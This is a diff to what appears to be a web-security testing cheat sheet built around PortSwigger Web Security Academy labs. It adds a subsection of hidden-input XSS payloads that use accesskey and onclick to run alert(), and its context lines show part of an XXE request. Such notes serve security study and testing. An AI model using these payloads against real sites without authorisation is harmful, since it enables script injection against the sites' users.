@@ -252,6 +252,19 @@ Host: 0a35003b04de89b2824392b5001e00b4.web-security-academy.net
 <stockCheck><productId>&xxe;</productId></stockCheck>
 ```
 ### :white_check_mark: Cross-site scripting (XSS)
+####
+####
+#### Unusual
+##### [Hidden input XSS](https://portswigger.net/research/xss-in-hidden-input-fields)
+This XSS can be triggered with ALT+SHIFT+KEY on Windows, and CTRL+ALT+KEY on MacOS.
+```
+<toto accesskey="A" onclick="alert(1)"></toto>
+<meta accesskey="C" onclick="alert(3)">
+<link rel="canonical" accesskey="X" onclick="alert(1)">
+<input type="hidden" accesskey="X" onclick="alert(1)">
+<input type="hidden" accesskey="X" onclick="alert(1)" x='>
+```
+
 ### :white_check_mark: Cross-site request forge (CSRF)
 _Burp suite extensions : CSRF Scanner_
 The extension is limited and does not perform many checks. Thus, the following should be tested :
